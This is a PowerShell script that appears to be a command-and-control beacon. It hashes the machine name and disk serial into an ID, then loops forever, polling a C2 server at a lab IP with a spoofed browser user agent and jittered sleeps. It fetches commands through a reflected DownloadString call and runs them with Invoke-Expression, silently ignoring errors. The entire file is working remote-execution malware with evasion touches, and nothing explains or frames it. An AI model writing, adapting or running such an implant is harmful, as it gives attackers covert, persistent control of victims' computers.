function f0()
{
    $query = "select * from win32_logicaldisk where DeviceID='C:'";
    $serialNumber = (Get-WmiObject -Query($query)).VolumeSerialNumber;
    $computerName = $env:computername;
    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    $hashBytes = $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($computerName) + [System.Text.Encoding]::UTF8.GetBytes(' ' + $serialNumber))
    $hashBytes = [System.Convert]::ToBase64String($hashBytes)
    return $hashBytes
}

do{
    # URL address of the C2
    $url = "http://10.0.2.2:8080"
    
    $MinSeconds = 5
    $MaxSeconds = 10
    
    $randomDelay = Get-Random -Minimum $MinSeconds -Maximum ($MaxSeconds + 1)
    $computerId = f0
    Start-Sleep -Seconds $randomDelay

    $userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0';

    $webClient = New-Object System.Net.WebClient;
    $webClient.Headers['User-Agent'] = $userAgent;
    $webClient.Headers.Add('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.5');
    $webClient.Headers.Add('Accept-Language', 'en-US;q=0.5,en;q=0.3');
    $webClient.Headers.Add('Upgrade-Insecure-Requests', '1');
    $webClient.Headers.Add('X-Cookie', $computerId);
                    
    # Invoke the DownloadString method to fetch data from the URL
    $meth = $webClient.GetType().GetMethods() | Where-Object { $_.Name -eq 'DownloadString' } | Select-Object -First 1
    try {
        $resp = $meth.Invoke($webClient, @($url));
        Invoke-Expression $resp
    }
    catch {
        # do nothing
    }

} while($true);